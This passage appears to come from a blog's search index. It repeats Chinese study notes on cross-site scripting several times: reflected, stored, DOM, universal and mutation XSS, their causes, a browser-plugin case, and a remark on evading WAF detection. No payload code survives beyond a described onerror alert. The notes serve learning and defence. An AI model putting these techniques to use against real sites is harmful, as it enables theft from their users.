这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#3dom型xss"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#漏洞成因-2"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#4通用型xss"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#漏洞成因-3"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#漏洞案例"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#5突变型xss"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。 (5)突变型XSS突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation） 漏洞成因然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。 攻击流程将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。 ","date":"2023-11-17","objectID":"/xss/:3:0","series":null,"tags":["notes"],"title":"XSS","uri":"/xss/#漏洞成因-4"},{"categories":["notes"],"content":"\r0x3 分类\r(1)反射型XSS（非持久型）反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。 漏洞成因当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种： 将不可信数据插入到HTML标签之间时；// 例如div, p, td； 将不可信数据插入到HTML属性里时；// 例如： 将不可信数据插入到SCRIPT里时；// 例如： 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如 将不可信数据插入到HTML URL里时，// 例如： 使用富文本时，没有使用XSS规则引擎进行编码过滤。 攻击流程反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。 (2)存储型XSS（持久型）\r漏洞成因存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。 攻击流程\r(3)DOM型XSS输入的恶意代码不会经过服务器，在前端被js代码直接读取放置到前端的标签中，是一 种特殊的反射型XSS。 漏洞成因DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。 下面编写一个简单的含有 DOM XSS漏洞的 HTML 代码： 用户输入框插入图片地址后，页面会将图片插入在id=“demo” 的 div 标签中，从而显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 会直接在img标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的 alert()函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。 (4)通用型XSS通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。 上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 漏洞成因Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。 不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。 漏洞案例IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞 这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla 